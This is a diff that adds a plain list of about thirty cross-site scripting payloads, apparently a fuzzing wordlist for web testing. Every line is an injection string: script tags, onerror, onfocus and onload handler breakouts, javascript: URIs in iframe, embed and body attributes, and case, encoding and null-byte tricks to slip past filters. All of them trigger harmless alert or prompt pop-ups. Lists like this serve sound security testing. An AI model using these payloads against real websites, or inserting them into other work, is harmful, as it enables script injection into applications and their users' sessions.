@@ -1,0 +1,30 @@
+<script></script>><img src=x onerror=prompt(1)>
+<script>alert(document.domain)</script>
+"><script>alert(document.domain)</script>
+" autofocus onfocus="alert(document.domain)
+"autofocus/onfocus="alert(document.domain)
+"autofocus/onfocus="confirm&#40;document.domain&#41;
+'-alert(document.domain)-'
+\'-alert(document.domain);<!--
+\'-alert(document.domain);//
+" autofocus="" onfocus="alert(document.domain)
+"><img src=x onerror=alert(1)>
+<sCriPt>alert('jon200')</sCriPt>
+<img/src=`%00` onerror=this.onerror=confirm(1)
+<script\x0Atype="text/javascript">javascript:alert(1);</script>
+<iframe/%00/ src=javaSCRIPT&colon;alert(1)
+<img\x10src=x onerror="javascript:alert(1)">
+<img\x13src=x onerror="javascript:alert(1)">
+<script ~~~>alert(0%0)</script ~~~>
+&lt;img src=x onerror=alert(&#39;Hi&#39;)&gt;
+<img src="x" onerror="alert('xss');">
+><svg/onload=confirm(1)>”@gmail154.comtm8
+alert(100)
+<sVg><scRipt %00>alert&lpar;1&rpar; {Opera}
+<iframe/src="data:text/html,<svg &#111;&#110;load=alert(1)>">
+<script>/* *\x2A/javascript:alert(1)// */</script>
+"`'><script>\x20javascript:alert(1)</script>
+<script>javascript:alert(1)<\x00/script>
+<embed src="javascript:alert(1)">
+<BODY ONLOAD=alert('XSS')>
+<BODY BACKGROUND="javascript:alert('XSS')">
